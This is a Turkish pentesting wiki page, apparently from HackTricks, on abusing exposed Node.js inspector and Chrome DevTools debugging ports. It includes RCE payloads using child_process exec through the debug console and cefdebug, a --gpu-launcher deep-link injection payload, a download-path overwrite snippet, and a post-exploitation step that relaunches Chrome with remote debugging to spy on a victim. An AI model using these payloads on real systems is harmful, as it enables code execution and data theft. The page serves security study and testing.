# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

[Docs'tan](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` switch'i ile başlatıldığında bir Node.js process'i bir debugging client'ı için dinleme yapar. **Varsayılan olarak**, **`127.0.0.1:9229`** host ve port'unda dinleme yapar. Her process'e ayrıca **benzersiz** bir **UUID** atanır.

Inspector client'ları bağlanmak için host adresini, port'u ve UUID'yi bilmeli ve belirtmelidir. Tam URL yaklaşık olarak şöyle görünür: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> **Debugger, Node.js execution environment'a tam erişime sahip olduğundan**, bu port'a bağlanabilen kötü amaçlı bir aktör Node.js process'i adına arbitrary code execute edebilir (**potential privilege escalation**).

Bir inspector'ı başlatmanın birkaç yolu vardır:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
İncelenen bir process'i başlattığınızda aşağıdakine benzer bir şey görünür:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) tabanlı işlemler, **debugger**'ı açmak için `--remote-debugging-port=9222` parametresini kullanmalıdır (SSRF korumaları oldukça benzerdir). Ancak **NodeJS** **debug** oturumu sağlamak yerine tarayıcıyla [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden iletişim kurarlar. Bu, tarayıcıyı kontrol etmeye yarayan bir arayüzdür, ancak doğrudan bir RCE yoktur.

Debug modunda bir tarayıcı başlattığınızda aşağıdakine benzer bir şey görüntülenir:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Tarayıcılar, WebSockets ve same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Bir web-browser'da açılan web siteleri, browser security model kapsamında WebSocket ve HTTP istekleri gönderebilir. **Benzersiz bir debugger session id elde etmek** için bir **initial HTTP connection** gereklidir. **Same-origin-policy**, web sitelerinin **bu HTTP connection'ı** kurabilmesini **engeller**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**'e** karşı ek güvenlik sağlamak için Node.js, bağlantıya ait **'Host' headers** değerlerinin ya bir **IP address** ya da tam olarak **`localhost`** veya **`localhost6`** belirttiğini doğrular.

> [!TIP]
> Bu **security measures, inspector'ı** yalnızca **bir HTTP request göndererek** çalıştırıp kod yürütmeyi engeller (bu, bir SSRF vuln'ı kullanılarak yapılabilirdi).

### Çalışan process'lerde inspector'ı başlatma

Çalışan bir nodejs process'ine **SIGUSR1** sinyali göndererek **inspector'ı** varsayılan portta **başlatmasını** sağlayabilirsiniz. Ancak yeterli privileges'a sahip olmanız gerektiğini unutmayın; bu, **process içindeki bilgilere privileged access** sağlayabilir, ancak doğrudan bir privilege escalation sağlamaz.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Bu, container'larda kullanışlıdır çünkü **process'i kapatıp `--inspect` ile yeni bir process başlatmak**, **container** process ile birlikte **sonlandırılacağı** için bir seçenek **değildir**.

### Inspector/debugger'a bağlanma

**Chromium tabanlı bir browser'a** bağlanmak için Chrome veya Edge'de sırasıyla `chrome://inspect` veya `edge://inspect` URL'lerine erişilebilir. Configure düğmesine tıklayarak **hedef host ve portun** doğru şekilde listelendiğinden emin olunmalıdır. Görselde bir Remote Code Execution (RCE) örneği gösterilmektedir:

![Debugger'a erişmek için bir URL görünecektir. ör. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Inspector/debugger'a bağlanma: **Chromium tabanlı bir browser'a** bağlanmak için,...](<../../images/image (674).png>)

**Komut satırını** kullanarak bir debugger/inspector'a şu şekilde bağlanabilirsiniz:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) aracı, yerel olarak çalışan **inspectors**'ları **bulmayı** ve bunlara **code enjekte etmeyi** sağlar.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden bir tarayıcıya bağlanıldığında **NodeJS RCE exploit'lerinin çalışmayacağını** unutmayın (bununla yapılabilecek ilginç şeyleri bulmak için API'yi kontrol etmeniz gerekir).

## NodeJS Debugger/Inspector'da RCE

> [!TIP]
> Buraya Electron'da bir XSS'ten [**RCE elde etmenin yolunu** arayarak geldiyseniz bu sayfayı kontrol edin.](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Bir Node **inspector**'ına **bağlanabildiğinizde** **RCE** elde etmenin yaygın yollarından biri aşağıdakine benzer bir şey kullanmaktır (**Chrome DevTools protocol** bağlantısında bunun çalışmayacağı görülüyor):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API'yi burada inceleyebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
Bu bölümde, insanların bu protocol'ü exploit etmek için kullandığını gördüğüm ilginç şeyleri listeleyeceğim.

### Parameter Injection via Deep Links

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kapsamında Rhino Security, CEF tabanlı bir uygulamanın sistemde (workspaces://index.html) özel bir UR**I** kaydettiğini keşfetti. Bu URI, URI'nin tamamını alıyor ve ardından CEF tabanlı uygulamay**ı**, bu URI'den kısmen oluşturulan bir configuration ile başlatıyordu.

URI parameter'larının URL decoded edildiği ve CEF tabanlı uygulamayı başlatmak için kullanıldığı keşfedildi. Bu da kullanıcının **`--gpu-launcher`** flag'ini **command line** içine **inject** etmesine ve keyfi işlemler yürütmesine olanak sağlıyordu.

Dolayısıyla aşağıdaki gibi bir payload:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Bir calc.exe çalıştırır.

### Dosyaların Üzerine Yazma

**İndirilen dosyaların kaydedileceği** klasörü değiştirin ve uygulamanın sık kullanılan **kaynak kodunun** üzerine **kötü amaçlı kodunuzla** yazmak için bir dosya indirin.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE ve exfiltration

Bu gönderiye göre: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) theriver'dan RCE elde etmek ve dahili sayfaları exfiltrate etmek mümkündür.

### Post-Exploitation

Gerçek bir ortamda ve **Chrome/Chromium tabanlı browser kullanan bir kullanıcı bilgisayarını ele geçirdikten sonra**, erişebilmek için **debugging etkin ve debugging portu port-forward edilmiş şekilde** bir Chrome process'i başlatabilirsiniz. Bu şekilde **victim'ın Chrome ile yaptığı her şeyi inceleyebilir ve hassas bilgileri çalabilirsiniz**.

Stealth yöntemi, **her Chrome process'ini sonlandırmak** ve ardından aşağıdakine benzer bir şey çağırmaktır
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referanslar

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
